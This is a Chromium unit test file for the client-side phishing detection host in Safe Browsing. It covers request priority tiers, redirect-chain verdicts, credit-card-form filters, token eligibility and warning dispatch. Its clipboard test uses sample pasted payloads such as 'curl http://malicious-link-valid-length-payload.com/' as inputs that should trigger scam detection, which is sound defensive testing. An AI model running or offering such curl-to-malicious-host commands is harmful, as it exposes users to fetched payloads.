// Copyright 2026 The Chromium Authors
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

#include "components/safe_browsing/core/browser/client_side_detection_host_base.h"

#include <memory>
#include <optional>
#include <string>
#include <vector>

#include "base/base_switches.h"
#include "base/memory/weak_ptr.h"
#include "base/test/metrics/histogram_tester.h"
#include "base/test/scoped_command_line.h"
#include "base/test/scoped_feature_list.h"
#include "base/test/task_environment.h"
#include "components/content_settings/core/browser/host_content_settings_map.h"
#include "components/history/core/browser/history_service.h"
#include "components/safe_browsing/core/browser/client_side_detection_feature_cache_base.h"
#include "components/safe_browsing/core/browser/client_side_detection_service_base.h"
#include "components/safe_browsing/core/browser/credit_card_form_event.h"
#include "components/safe_browsing/core/browser/db/sb_protocol_manager_util.h"
#include "components/safe_browsing/core/browser/verdict_cache_manager.h"
#include "components/safe_browsing/core/common/features.h"
#include "components/safe_browsing/core/common/phishing_classifier/scorer.h"
#include "components/safe_browsing/core/common/phishing_classifier/test_utils.h"
#include "components/safe_browsing/core/common/proto/csd.pb.h"
#include "components/safe_browsing/core/common/safe_browsing_prefs.h"
#include "components/safe_browsing/core/common/visual_utils.h"
#include "components/sync_preferences/testing_pref_service_syncable.h"
#include "net/http/http_status_code.h"
#include "testing/gmock/include/gmock/gmock.h"
#include "testing/gtest/include/gtest/gtest.h"
#include "third_party/skia/include/core/SkBitmap.h"
#include "ui/gfx/image/image.h"
#include "url/gurl.h"

using ::testing::_;
using ::testing::Mock;
using ::testing::Optional;
using ::testing::Return;

namespace safe_browsing {

class MockClientSideDetectionServiceBase
    : public ClientSideDetectionServiceBase {
 public:
  MockClientSideDetectionServiceBase()
      : ClientSideDetectionServiceBase(
            std::unique_ptr<ClientSideDetectionServiceBase::Delegate>(nullptr),
            nullptr) {}

  MOCK_METHOD(int, GetTriggerModelVersion, (), (const, override));
  MOCK_METHOD(bool, IsModelAvailable, (), (const, override));
  MOCK_METHOD(bool, HasImageEmbeddingModel, (), (const, override));
  MOCK_METHOD(bool,
              IsModelMetadataImageEmbeddingVersionMatching,
              (),
              (const, override));
  MOCK_METHOD(void,
              SendClientReportPhishingRequest,
              (std::unique_ptr<ClientPhishingRequest> verdict,
               ClientReportPhishingRequestCallback callback,
               const std::string& access_token),
              (override));
};

class MockIntelligentScanDelegate : public IntelligentScanDelegate {
 public:
  MOCK_METHOD(bool,
              ShouldRequestIntelligentScan,
              (ClientPhishingRequest*),
              (override));
  MOCK_METHOD(ModelType, GetIntelligentScanModelType, (bool), (override));
  MOCK_METHOD(std::optional<base::UnguessableToken>,
              StartIntelligentScan,
              (std::string,
               std::string,
               std::optional<std::string>,
               IntelligentScanDoneCallback),
              (override));
  MOCK_METHOD(bool,
              CancelIntelligentScan,
              (const base::UnguessableToken&),
              (override));
  MOCK_METHOD(bool,
              ShouldShowScamWarning,
              (std::optional<IntelligentScanVerdict>),
              (override));
  MOCK_METHOD(void, OnScamWarningShown, (), (override));
};

gfx::Image CreateTestImage() {
  SkBitmap bitmap;
  bitmap.allocN32Pixels(48, 48);
  bitmap.eraseColor(SK_ColorWHITE);
  return gfx::Image::CreateFrom1xBitmap(bitmap);
}

class TestClientSideDetectionHostBase : public ClientSideDetectionHostBase {
 public:
  TestClientSideDetectionHostBase(
      VerdictCacheManager* cache_manager,
      PrefService* pref_service,
      history::HistoryService* history_service,
      base::WeakPtr<ClientSideDetectionServiceBase> csd_service,
      bool is_off_the_record,
      IntelligentScanDelegate* intelligent_scan_delegate = nullptr)
      : ClientSideDetectionHostBase(csd_service,
                                    cache_manager,
                                    intelligent_scan_delegate,
                                    pref_service,
                                    /*token_fetcher=*/nullptr,
                                    history_service,
                                    is_off_the_record) {}
  ~TestClientSideDetectionHostBase() override = default;

  using ClientSideDetectionHostBase::GetBlockingPageThreatType;

  MOCK_METHOD(void, GetInnerText, (HostInnerTextCallback callback), (override));

  MOCK_METHOD(std::vector<GURL>, GetRedirectChain, (), (override));
  MOCK_METHOD(bool, IsAccountSignedIn, (), (override));
  MOCK_METHOD(bool, IsErrorDocument, (), (override));
  MOCK_METHOD(ChromeUserPopulation, GetUserPopulation, (), (override));
  MOCK_METHOD(void,
              MaybeStartGeminiAntiscamProtection,
              (GURL url,
               ClientSideDetectionType request_type,
               std::optional<bool> did_match_high_confidence_allowlist),
              (override));
  GURL GetCurrentUrl() const override { return current_url(); }
  MOCK_METHOD(void,
              ClassifyPhishingThroughThresholds,
              (ClientPhishingRequest * verdict),
              (override));
  MOCK_METHOD(void, MaybeRunUserReportCallback, (), (override));

  ClientSideDetectionFeatureCacheBase* GetFeatureCache() override {
    return &feature_cache_;
  }

  void MaybeStartImageEmbedding(
      std::unique_ptr<ClientPhishingRequest> verdict,
      std::optional<bool> did_match_high_confidence_allowlist,
      bool is_invalid_ip,
      PhishingDetectorResult result) override {
    if (use_browser_side_image_embedding_) {
      StartBrowserSideImageEmbedding(std::move(verdict),
                                     did_match_high_confidence_allowlist,
                                     is_invalid_ip, result);
    }
  }

  void CaptureScreenshot(ScreenshotCallback callback) override {
    ++capture_screenshot_count_;
    std::move(callback).Run(next_screenshot_);
  }

  visual_utils::CanExtractVisualFeaturesResult
  DetermineVisualFeaturesExtraction() override {
    return can_extract_visual_features_result_;
  }

  void OnVisualClassificationEarlyReturn(
      VisualClassificationEarlyReturnReason reason) override {
    last_early_return_reason_ = reason;
    ClientSideDetectionHostBase::OnVisualClassificationEarlyReturn(reason);
  }

  void CancelPendingRequests() override {
    ++cancel_pending_requests_count_;
    // Mirrors the platform hosts, which cancel the browser-side engines as
    // part of cancelling pending requests.
    CancelBrowserSideClassification();
    ClientSideDetectionHostBase::CancelPendingRequests();
  }

  void set_use_browser_side_image_embedding(bool value) {
    use_browser_side_image_embedding_ = value;
  }
  void set_next_screenshot(const gfx::Image& image) {
    next_screenshot_ = image;
  }
  void set_can_extract_visual_features_result(
      visual_utils::CanExtractVisualFeaturesResult result) {
    can_extract_visual_features_result_ = result;
  }

  void MaybeStartPreClassification(
      ClientSideDetectionType request_type) override {
    last_preclassification_request_type_ = request_type;
    set_last_committed_url(request_type, current_url());
  }

  credit_card_form::ReferringApp GetReferringApp() const override {
    return referring_app_;
  }

  void set_referring_app(credit_card_form::ReferringApp referring_app) {
    referring_app_ = referring_app;
  }

  MOCK_METHOD(void,
              MaybeShowPhishingWarning,
              (bool is_from_cache,
               ClientSideDetectionType request_type,
               std::optional<bool> did_match_high_confidence_allowlist,
               GURL phishing_url,
               bool is_phishing,
               std::optional<net::HttpStatusCode> response_code,
               std::optional<IntelligentScanVerdict> intelligent_scan_verdict),
              (override));

  void CallMaybeShowPhishingWarning(
      bool is_from_cache,
      ClientSideDetectionType request_type,
      std::optional<bool> did_match_high_confidence_allowlist,
      GURL phishing_url,
      bool is_phishing,
      std::optional<net::HttpStatusCode> response_code,
      std::optional<IntelligentScanVerdict> intelligent_scan_verdict) {
    ClientSideDetectionHostBase::MaybeShowPhishingWarning(
        is_from_cache, request_type, did_match_high_confidence_allowlist,
        phishing_url, is_phishing, response_code, intelligent_scan_verdict);
  }

  std::optional<double> GetSiteEngagementScore(const GURL& url) const override {
    return site_engagement_score_;
  }

  void set_site_engagement_score(std::optional<double> score) {
    site_engagement_score_ = score;
  }
  MOCK_METHOD(void,
              ShowBlockingPage,
              (GURL phishing_url,
               ClientSideDetectionType request_type,
               std::optional<IntelligentScanVerdict> intelligent_scan_verdict,
               bool is_phishing,
               bool should_show_scam_warning),
              (override));
  MOCK_METHOD(void,
              UpdateDebuggingMetadataWithNetworkResult,
              (GURL phishing_url, net::HttpStatusCode response_code),
              (override));

  void AddReferrerChain(ClientPhishingRequest* verdict) override {}

  using ClientSideDetectionHostBase::
      AddMiscellaneousMetadataToClientPhishingRequest;
  using ClientSideDetectionHostBase::CancelBrowserSideClassification;
  using ClientSideDetectionHostBase::CanGetAccessToken;
  using ClientSideDetectionHostBase::CanSendSamplePing;
  using ClientSideDetectionHostBase::classification_image_;
  using ClientSideDetectionHostBase::classifier_;
  using ClientSideDetectionHostBase::ExtractClipboardData;
  using ClientSideDetectionHostBase::GetTierValue;
  using ClientSideDetectionHostBase::HasDonePreclassificationCheckOnSameURL;
  using ClientSideDetectionHostBase::HasForceRequestFromRtUrlLookup;
  using ClientSideDetectionHostBase::image_embedder_;
  using ClientSideDetectionHostBase::is_classifying;
  using ClientSideDetectionHostBase::is_csd_running;
  using ClientSideDetectionHostBase::MaybeSendClientPhishingRequest;
  using ClientSideDetectionHostBase::NewRequestTypeTierHigher;
  using ClientSideDetectionHostBase::OnCreditCardFormVisitCount;
  using ClientSideDetectionHostBase::OnImageEmbeddingDone;
  using ClientSideDetectionHostBase::OnIntelligentScanDone;
  using ClientSideDetectionHostBase::OnTextCopiedToClipboard;
  using ClientSideDetectionHostBase::OnVisualClassificationDone;
  using ClientSideDetectionHostBase::PhishingDetectionDone;
  using ClientSideDetectionHostBase::SendRequest;
  using ClientSideDetectionHostBase::set_current_url;
  using ClientSideDetectionHostBase::set_is_classifying;
  using ClientSideDetectionHostBase::set_is_csd_running;
  using ClientSideDetectionHostBase::set_last_request_type;
  using ClientSideDetectionHostBase::ShouldAcceptHCAllowlist;
  using ClientSideDetectionHostBase::ShouldCaptureScreenshotForIntelligentScan;
  using ClientSideDetectionHostBase::StartBrowserSideImageEmbedding;
  using ClientSideDetectionHostBase::StartIntelligentScan;
  using ClientSideDetectionHostBase::StartVisualClassification;

  ClientSideDetectionFeatureCacheBase feature_cache_;
  std::optional<ClientSideDetectionType> last_preclassification_request_type_;
  credit_card_form::ReferringApp referring_app_ =
      credit_card_form::ReferringApp::kNoReferringApp;
  std::optional<double> site_engagement_score_;
  bool use_browser_side_image_embedding_ = false;
  gfx::Image next_screenshot_;
  int capture_screenshot_count_ = 0;
  int cancel_pending_requests_count_ = 0;
  visual_utils::CanExtractVisualFeaturesResult
      can_extract_visual_features_result_ = visual_utils::
          CanExtractVisualFeaturesResult::kCanExtractVisualFeatures;
  std::optional<VisualClassificationEarlyReturnReason>
      last_early_return_reason_;
};

class ClientSideDetectionHostBaseTest : public testing::Test {
 protected:
  ClientSideDetectionHostBaseTest() = default;
  ~ClientSideDetectionHostBaseTest() override = default;

  void SetUp() override {
    RegisterProfilePrefs(prefs_.registry());
    HostContentSettingsMap::RegisterProfilePrefs(prefs_.registry());
    content_setting_map_ = new HostContentSettingsMap(
        &prefs_, false /* is_off_the_record */, false /* store_last_modified */,
        false /* restore_session */, false /* should_record_metrics */);
    cache_manager_ = std::make_unique<VerdictCacheManager>(
        /*history_service=*/nullptr, content_setting_map_.get(), &prefs_,
        /*sync_observer=*/nullptr);

    host_ = std::make_unique<TestClientSideDetectionHostBase>(
        cache_manager_.get(), &prefs_, /*history_service=*/nullptr,
        /*csd_service=*/nullptr, /*is_off_the_record=*/false);
  }

  void TearDown() override {
    host_.reset();
    cache_manager_->Shutdown();
    cache_manager_.reset();
    content_setting_map_->ShutdownOnUIThread();
  }

  base::test::TaskEnvironment task_environment_;
  sync_preferences::TestingPrefServiceSyncable prefs_;
  scoped_refptr<HostContentSettingsMap> content_setting_map_;
  std::unique_ptr<VerdictCacheManager> cache_manager_;
  std::unique_ptr<TestClientSideDetectionHostBase> host_;
  base::test::ScopedFeatureList feature_list_;
};

TEST(ClientSideDetectionHostBaseStaticTest, GetBlockingPageThreatType) {
  EXPECT_EQ(TestClientSideDetectionHostBase::GetBlockingPageThreatType(
                /*is_phishing=*/true, ThreatSubtype::UNKNOWN),
            SBThreatType::SB_THREAT_TYPE_URL_CLIENT_SIDE_PHISHING);
  EXPECT_EQ(TestClientSideDetectionHostBase::GetBlockingPageThreatType(
                /*is_phishing=*/false,
                ThreatSubtype::SCAM_EXPERIMENT_CATCH_ALL_ENFORCEMENT),
            SBThreatType::SB_THREAT_TYPE_URL_CLIENT_SIDE_PHISHING);
  EXPECT_EQ(TestClientSideDetectionHostBase::GetBlockingPageThreatType(
                /*is_phishing=*/false,
                ThreatSubtype::SCAM_EXPERIMENT_VERDICT_BILLING),
            SBThreatType::SB_THREAT_TYPE_BILLING);
  // The phishing interstitial takes precedence over the billing interstitial.
  EXPECT_EQ(
      TestClientSideDetectionHostBase::GetBlockingPageThreatType(
          /*is_phishing=*/true, ThreatSubtype::SCAM_EXPERIMENT_VERDICT_BILLING),
      SBThreatType::SB_THREAT_TYPE_URL_CLIENT_SIDE_PHISHING);
}

TEST_F(ClientSideDetectionHostBaseTest, PriorityTier) {
  // Lower tier value means higher priority tier.
  EXPECT_EQ(host_->GetTierValue(NOTIFICATION_PERMISSION_PROMPT), 0);
  EXPECT_EQ(host_->GetTierValue(FORCE_REQUEST), 1);
  EXPECT_EQ(host_->GetTierValue(KEYBOARD_LOCK_REQUESTED), 1);
  EXPECT_EQ(host_->GetTierValue(USER_REPORT), 1);
  EXPECT_EQ(host_->GetTierValue(VIBRATION_API), 2);
  EXPECT_EQ(host_->GetTierValue(CLIPBOARD_COPY_API), 2);
  EXPECT_EQ(host_->GetTierValue(CREDIT_CARD_FORM), 2);
  EXPECT_EQ(host_->GetTierValue(UNFAMILIAR_LOGIN_PAGE), 2);
  EXPECT_EQ(host_->GetTierValue(TRIGGER_MODELS), 3);
  EXPECT_EQ(host_->GetTierValue(IMAGE_EMBEDDING_MATCH), 3);

  EXPECT_DEATH_IF_SUPPORTED(
      host_->GetTierValue(CLIENT_SIDE_DETECTION_TYPE_UNSPECIFIED), "");
  EXPECT_DEATH_IF_SUPPORTED(host_->GetTierValue(POINTER_LOCK_REQUESTED), "");
  EXPECT_DEATH_IF_SUPPORTED(host_->GetTierValue(FULLSCREEN_API), "");
  EXPECT_DEATH_IF_SUPPORTED(host_->GetTierValue(POLICY_ENGINE), "");

  // Default last request type is unspecified, so any new request type is
  // higher.
  EXPECT_TRUE(host_->NewRequestTypeTierHigher(TRIGGER_MODELS));

  // Simulate last request being TRIGGER_MODELS (tier 3):
  host_->set_last_request_type(TRIGGER_MODELS);
  // IMAGE_EMBEDDING_MATCH is also tier 3, so it is not higher (returns false).
  EXPECT_FALSE(host_->NewRequestTypeTierHigher(IMAGE_EMBEDDING_MATCH));
  // KEYBOARD_LOCK_REQUESTED is tier 1 (higher than tier 3), so returns true.
  EXPECT_TRUE(host_->NewRequestTypeTierHigher(KEYBOARD_LOCK_REQUESTED));
}

TEST_F(ClientSideDetectionHostBaseTest,
       HasDonePreclassificationCheckOnSameURL) {
  GURL url1("https://example.com/1");
  GURL url2("https://example.com/2");

  host_->set_current_url(url1);
  // If last_committed_url_map_ doesn't have TRIGGER_MODELS entry, it should
  // return false.
  EXPECT_FALSE(host_->HasDonePreclassificationCheckOnSameURL(TRIGGER_MODELS));

  // Simulating check completed on url1.
  host_->MaybeStartPreClassification(TRIGGER_MODELS);
  EXPECT_TRUE(host_->HasDonePreclassificationCheckOnSameURL(TRIGGER_MODELS));

  // Navigating to url2.
  host_->set_current_url(url2);
  EXPECT_FALSE(host_->HasDonePreclassificationCheckOnSameURL(TRIGGER_MODELS));
}

TEST_F(ClientSideDetectionHostBaseTest, HasForceRequestFromRtUrlLookup) {
  GURL url("https://example.com/");
  host_->set_current_url(url);

  // Enhanced protection is disabled by default.
  SetEnhancedProtectionPrefForTests(&prefs_, false);
  EXPECT_FALSE(host_->HasForceRequestFromRtUrlLookup());

  // Enable Enhanced Protection.
  SetEnhancedProtectionPrefForTests(&prefs_, true);

  // Cache manager has no verdict.
  EXPECT_FALSE(host_->HasForceRequestFromRtUrlLookup());

  // Set cached verdict to FORCE_REQUEST.
  RTLookupResponse response;
  RTLookupResponse::ThreatInfo* threat_info = response.add_threat_info();
  threat_info->set_verdict_type(RTLookupResponse::ThreatInfo::DANGEROUS);
  threat_info->set_threat_type(
      RTLookupResponse::ThreatInfo::SOCIAL_ENGINEERING);
  threat_info->set_cache_duration_sec(60);
  threat_info->set_cache_expression_using_match_type("example.com/");
  threat_info->set_cache_expression_match_type(
      RTLookupResponse::ThreatInfo::EXACT_MATCH);
  response.set_client_side_detection_type(FORCE_REQUEST);
  cache_manager_->CacheRealTimeUrlVerdict(response, base::Time::Now());

  EXPECT_TRUE(host_->HasForceRequestFromRtUrlLookup());
}

TEST_F(ClientSideDetectionHostBaseTest,
       HasForceRequestFromRtUrlLookupRedirectChain) {
  base::test::ScopedFeatureList feature_list;
  feature_list.InitAndDisableFeature(
      kClientSideDetectionRedirectChainKillswitch);

  GURL url1("https://example.com/1");
  GURL url2("https://example.com/2");
  host_->set_current_url(url2);

  SetEnhancedProtectionPrefForTests(&prefs_, true);

  // Redirect chain has url1 and url2.
  std::vector<GURL> redirect_chain = {url1, url2};
  EXPECT_CALL(*host_, GetRedirectChain())
      .WillRepeatedly(Return(redirect_chain));

  // Cache has no entries.
  EXPECT_FALSE(host_->HasForceRequestFromRtUrlLookup());

  // Set cached verdict for redirect source url1 to FORCE_REQUEST.
  RTLookupResponse response;
  RTLookupResponse::ThreatInfo* threat_info = response.add_threat_info();
  threat_info->set_verdict_type(RTLookupResponse::ThreatInfo::DANGEROUS);
  threat_info->set_threat_type(
      RTLookupResponse::ThreatInfo::SOCIAL_ENGINEERING);
  threat_info->set_cache_duration_sec(60);
  threat_info->set_cache_expression_using_match_type("example.com/1");
  threat_info->set_cache_expression_match_type(
      RTLookupResponse::ThreatInfo::EXACT_MATCH);
  response.set_client_side_detection_type(FORCE_REQUEST);
  cache_manager_->CacheRealTimeUrlVerdict(response, base::Time::Now());

  // Should identify FORCE_REQUEST in redirect chain.
  EXPECT_TRUE(host_->HasForceRequestFromRtUrlLookup());

  // Enable redirect chain killswitch.
  base::test::ScopedFeatureList killswitch_feature_list;
  killswitch_feature_list.InitAndEnableFeature(
      kClientSideDetectionRedirectChainKillswitch);

  // With killswitch enabled, it should return false (ignore redirect chain
  // FORCE_REQUEST).
  EXPECT_FALSE(host_->HasForceRequestFromRtUrlLookup());
}

TEST_F(ClientSideDetectionHostBaseTest, OnTextCopiedToClipboard) {
  base::test::ScopedFeatureList feature_list;
  feature_list.InitAndEnableFeatureWithParameters(
      kClientSideDetectionClipboardCopyApi,
      {{"MinLength", "10"}, {"MaxLength", "1000"}});

  // Enhanced Protection is disabled.
  SetEnhancedProtectionPrefForTests(&prefs_, false);
  host_->last_preclassification_request_type_.reset();
  host_->OnTextCopiedToClipboard(u"http://malicious-link.com/payload");

  // Verify that StartPreClassification is NOT called.
  EXPECT_FALSE(host_->last_preclassification_request_type_.has_value());

  // Enable Enhanced Protection.
  SetEnhancedProtectionPrefForTests(&prefs_, true);

  // Too short payload (length 8 < 10).
  host_->OnTextCopiedToClipboard(u"curl abc");
  EXPECT_FALSE(host_->last_preclassification_request_type_.has_value());

  // Too long payload (length 2005 > 1000).
  std::u16string long_payload = u"curl " + std::u16string(2000, 'a');
  host_->OnTextCopiedToClipboard(long_payload);
  EXPECT_FALSE(host_->last_preclassification_request_type_.has_value());

  // Valid payload. `MaybeStartPreClassification()` should be triggered.
  host_->OnTextCopiedToClipboard(
      u"curl http://malicious-link-valid-length-payload.com/");
  ASSERT_TRUE(host_->last_preclassification_request_type_.has_value());
  EXPECT_EQ(host_->last_preclassification_request_type_, CLIPBOARD_COPY_API);
}

TEST_F(ClientSideDetectionHostBaseTest,
       AddMiscellaneousMetadataToClientPhishingRequest) {
  GURL url("https://example.com/some-page");
  host_->set_current_url(url);
  host_->set_last_request_type(TRIGGER_MODELS);

  ChromeUserPopulation population;
  population.set_user_population(ChromeUserPopulation::ENHANCED_PROTECTION);
  EXPECT_CALL(*host_, GetUserPopulation()).WillRepeatedly(Return(population));

  ClientPhishingRequest request;
  request.set_url(url.spec());
  request.set_client_side_detection_type(TRIGGER_MODELS);

  host_->AddMiscellaneousMetadataToClientPhishingRequest(
      &request, /*is_invalid_ip=*/false);

  EXPECT_EQ(request.url(), url.spec());
  EXPECT_EQ(request.client_side_detection_type(), TRIGGER_MODELS);
  EXPECT_EQ(request.population().user_population(),
            ChromeUserPopulation::ENHANCED_PROTECTION);
}

TEST_F(ClientSideDetectionHostBaseTest, PhishingDetectionDoneMetricsAndCache) {
  GURL url("https://example.com/");
  host_->set_current_url(url);

  SetEnhancedProtectionPrefForTests(&prefs_, true);

  MockClientSideDetectionServiceBase mock_csd_service;
  EXPECT_CALL(mock_csd_service, GetTriggerModelVersion())
      .WillRepeatedly(Return(12345));

  host_ = std::make_unique<TestClientSideDetectionHostBase>(
      cache_manager_.get(), &prefs_, /*history_service=*/nullptr,
      mock_csd_service.GetWeakPtr(), /*is_off_the_record=*/false);
  host_->set_current_url(url);

  base::HistogramTester histograms;
  base::TimeTicks start_time = base::TimeTicks::Now();

  ClientPhishingRequest request;
  request.set_url(url.spec());
  request.set_client_score(0.9f);

  host_->PhishingDetectionDone(
      TRIGGER_MODELS, /*is_sample_ping=*/false,
      /*did_match_high_confidence_allowlist=*/false, /*is_invalid_ip=*/false,
      start_time, PhishingDetectorResult::CLASSIFICATION_SUCCESS, request);

  // Histograms should be logged.
  histograms.ExpectUniqueSample(
      "SBClientPhishing.PhishingDetectorResult.TriggerModel",
      PhishingDetectorResult::CLASSIFICATION_SUCCESS, 1);

  // Verify Cache has correct model version.
  auto* metadata =
      host_->feature_cache_.GetOrCreateDebuggingMetadataForURL(url);
  ASSERT_NE(metadata, nullptr);
  EXPECT_EQ(metadata->csd_model_version(), 12345);
  EXPECT_EQ(metadata->phishing_detector_result(),
            PhishingDetectorResult::CLASSIFICATION_SUCCESS);
}

TEST_F(ClientSideDetectionHostBaseTest,
       PhishingDetectionDoneFailedClassification) {
  base::HistogramTester histograms;
  base::TimeTicks start_time = base::TimeTicks::Now();

  // Set internal state to true to verify it is reset.
  host_->set_is_csd_running(true);
  host_->set_is_classifying(true);

  // Failed detector result.
  host_->PhishingDetectionDone(TRIGGER_MODELS, /*is_sample_ping=*/false,
                               /*did_match_high_confidence_allowlist=*/false,
                               /*is_invalid_ip=*/false, start_time,
                               PhishingDetectorResult::CLASSIFIER_NOT_READY,
                               std::nullopt);

  histograms.ExpectUniqueSample(
      "SBClientPhishing.PhishingDetectorResult.TriggerModel",
      PhishingDetectorResult::CLASSIFIER_NOT_READY, 1);

  // Verify state transitions.
  EXPECT_FALSE(host_->is_csd_running());
  EXPECT_FALSE(host_->is_classifying());
}

TEST_F(ClientSideDetectionHostBaseTest, SendRequest) {
  GURL url("https://example.com/");
  host_->set_current_url(url);

  MockClientSideDetectionServiceBase mock_csd_service;
  // Recreate host with injected mock service
  host_ = std::make_unique<TestClientSideDetectionHostBase>(
      cache_manager_.get(), &prefs_, /*history_service=*/nullptr,
      mock_csd_service.GetWeakPtr(), /*is_off_the_record=*/false);
  host_->set_current_url(url);

  auto verdict = std::make_unique<ClientPhishingRequest>();
  verdict->set_url(url.spec());
  verdict->set_client_score(0.9f);
  verdict->set_client_side_detection_type(TRIGGER_MODELS);

  // Verify that Gemini Antiscam protection is potentially started.
  EXPECT_CALL(*host_,
              MaybeStartGeminiAntiscamProtection(url, TRIGGER_MODELS, _))
      .Times(1);

  // Verify that the request is forwarded to the service.
  EXPECT_CALL(mock_csd_service, SendClientReportPhishingRequest(_, _, "token"))
      .WillOnce(
          [](std::unique_ptr<ClientPhishingRequest> verdict,
             ClientSideDetectionServiceBase::ClientReportPhishingRequestCallback
                 callback,
             const std::string& access_token) {
            std::move(callback).Run(GURL("https://example.com/"), true,
                                    net::HTTP_OK, std::nullopt);
          });

  EXPECT_CALL(*host_,
              MaybeShowPhishingWarning(
                  /*is_from_cache=*/false,
                  /*request_type=*/TRIGGER_MODELS,
                  /*did_match_high_confidence_allowlist=*/Optional(false),
                  /*phishing_url=*/GURL("https://example.com/"),
                  /*is_phishing=*/true,
                  /*response_code=*/Optional(net::HTTP_OK),
                  /*intelligent_scan_verdict=*/_))
      .Times(1);

  host_->SendRequest(std::move(verdict), "token",
                     /*did_match_high_confidence_allowlist=*/false,
                     /*is_invalid_ip=*/false);

  // State should be reset.
  EXPECT_FALSE(host_->is_csd_running());
}

// Verifies that OnCreditCardFormVisitCount returns early without triggering
// if the `should_trigger` flag is false.
TEST_F(ClientSideDetectionHostBaseTest,
       OnCreditCardFormVisitCount_ShouldTriggerFalse) {
  SetEnhancedProtectionPrefForTests(&prefs_, true);

  host_->set_current_url(GURL("https://example.com"));

  host_->OnCreditCardFormVisitCount(
      /*start_time=*/std::nullopt,
      credit_card_form::FieldDetectionHeuristic::kAutofillLocal, "event",
      /*should_trigger=*/false,
      history::DailyVisitsResult{/*success=*/true, /*days_with_visits=*/1,
                                 /*total_visits=*/1});

  EXPECT_FALSE(host_->last_preclassification_request_type_.has_value());
}

// Verifies that OnCreditCardFormVisitCount filters out repeat site visits
// when the New Site Filter is enabled.
TEST_F(ClientSideDetectionHostBaseTest,
       OnCreditCardFormVisitCount_NewSiteFilter_RepeatSite) {
  base::test::ScopedFeatureList feature_list;
  feature_list.InitAndEnableFeatureWithParameters(
      kClientSideDetectionCreditCardForm,
      {{kCsdCreditCardFormEnableNewSiteFilter.name, "true"},
       {kCsdCreditCardFormMaxUserVisit.name, "1"}});

  SetEnhancedProtectionPrefForTests(&prefs_, true);

  host_->set_current_url(GURL("https://example.com"));

  // Total visits > 1 means it's a repeat site.
  host_->OnCreditCardFormVisitCount(
      /*start_time=*/std::nullopt,
      credit_card_form::FieldDetectionHeuristic::kAutofillLocal, "event",
      /*should_trigger=*/true,
      history::DailyVisitsResult{/*success=*/true, /*days_with_visits=*/1,
                                 /*total_visits=*/2});

  EXPECT_FALSE(host_->last_preclassification_request_type_.has_value());
}

// Verifies that OnCreditCardFormVisitCount proceeds with pre-classification
// for new site visits when the New Site Filter is enabled.
TEST_F(ClientSideDetectionHostBaseTest,
       OnCreditCardFormVisitCount_NewSiteFilter_NewSite_Proceeds) {
  base::test::ScopedFeatureList feature_list;
  feature_list.InitAndEnableFeatureWithParameters(
      kClientSideDetectionCreditCardForm,
      {{kCsdCreditCardFormEnableNewSiteFilter.name, "true"},
       {kCsdCreditCardFormMaxUserVisit.name, "1"}});

  SetEnhancedProtectionPrefForTests(&prefs_, true);

  host_->set_current_url(GURL("https://example.com"));

  // Total visits <= 1 means it's a new site.
  host_->OnCreditCardFormVisitCount(
      /*start_time=*/std::nullopt,
      credit_card_form::FieldDetectionHeuristic::kAutofillLocal, "event",
      /*should_trigger=*/true,
      history::DailyVisitsResult{/*success=*/true, /*days_with_visits=*/1,
                                 /*total_visits=*/1});

  EXPECT_TRUE(host_->last_preclassification_request_type_.has_value());
  EXPECT_EQ(host_->last_preclassification_request_type_.value(),
            CREDIT_CARD_FORM);
}

// Verifies that OnCreditCardFormVisitCount filters out events detected via
// Autofill Server heuristics when the Heuristic Filter is enabled.
TEST_F(ClientSideDetectionHostBaseTest,
       OnCreditCardFormVisitCount_HeuristicFilter_AutofillServer) {
  base::test::ScopedFeatureList feature_list;
  feature_list.InitAndEnableFeatureWithParameters(
      kClientSideDetectionCreditCardForm,
      {{kCsdCreditCardFormEnableHeuristicFilter.name, "true"}});

  SetEnhancedProtectionPrefForTests(&prefs_, true);

  host_->set_current_url(GURL("https://example.com"));

  host_->OnCreditCardFormVisitCount(
      /*start_time=*/std::nullopt,
      credit_card_form::FieldDetectionHeuristic::kAutofillServer, "event",
      /*should_trigger=*/true,
      history::DailyVisitsResult{/*success=*/true, /*days_with_visits=*/1,
                                 /*total_visits=*/1});

  EXPECT_FALSE(host_->last_preclassification_request_type_.has_value());
}

// Verifies that OnCreditCardFormVisitCount filters out events that do NOT
// originate from the SMS app when the Referring App Filter is enabled.
TEST_F(ClientSideDetectionHostBaseTest,
       OnCreditCardFormVisitCount_ReferringAppFilter_NotSmsApp) {
  base::test::ScopedFeatureList feature_list;
  feature_list.InitAndEnableFeatureWithParameters(
      kClientSideDetectionCreditCardForm,
      {{kCsdCreditCardFormEnableReferringAppFilter.name, "true"}});

  SetEnhancedProtectionPrefForTests(&prefs_, true);

  host_->set_current_url(GURL("https://example.com"));
  // Simulate that the navigation did NOT originate from the SMS app.
  host_->set_referring_app(credit_card_form::ReferringApp::kNoReferringApp);

  host_->OnCreditCardFormVisitCount(
      /*start_time=*/std::nullopt,
      credit_card_form::FieldDetectionHeuristic::kAutofillLocal, "event",
      /*should_trigger=*/true,
      history::DailyVisitsResult{/*success=*/true, /*days_with_visits=*/1,
                                 /*total_visits=*/1});

  EXPECT_FALSE(host_->last_preclassification_request_type_.has_value());
}

TEST_F(ClientSideDetectionHostBaseTest, CanGetAccessToken) {
  // Enhanced protection disabled -> False.
  SetEnhancedProtectionPrefForTests(&prefs_, false);
  EXPECT_FALSE(host_->CanGetAccessToken());

  // Enhanced protection enabled, not signed in -> False.
  SetEnhancedProtectionPrefForTests(&prefs_, true);
  EXPECT_CALL(*host_, IsAccountSignedIn()).WillRepeatedly(Return(false));
  EXPECT_FALSE(host_->CanGetAccessToken());

  // Enhanced protection enabled, signed in, off the record -> False.
  EXPECT_CALL(*host_, IsAccountSignedIn()).WillRepeatedly(Return(true));

  // Recreate host with is_off_the_record = true
  host_ = std::make_unique<TestClientSideDetectionHostBase>(
      cache_manager_.get(), &prefs_, /*history_service=*/nullptr,
      /*csd_service=*/nullptr, /*is_off_the_record=*/true);
  EXPECT_CALL(*host_, IsAccountSignedIn()).WillRepeatedly(Return(true));
  EXPECT_FALSE(host_->CanGetAccessToken());

  // Enhanced protection enabled, signed in, not off the record -> True.
  // Recreate host with is_off_the_record = false
  host_ = std::make_unique<TestClientSideDetectionHostBase>(
      cache_manager_.get(), &prefs_, /*history_service=*/nullptr,
      /*csd_service=*/nullptr, /*is_off_the_record=*/false);
  EXPECT_CALL(*host_, IsAccountSignedIn()).WillRepeatedly(Return(true));
  EXPECT_TRUE(host_->CanGetAccessToken());
}

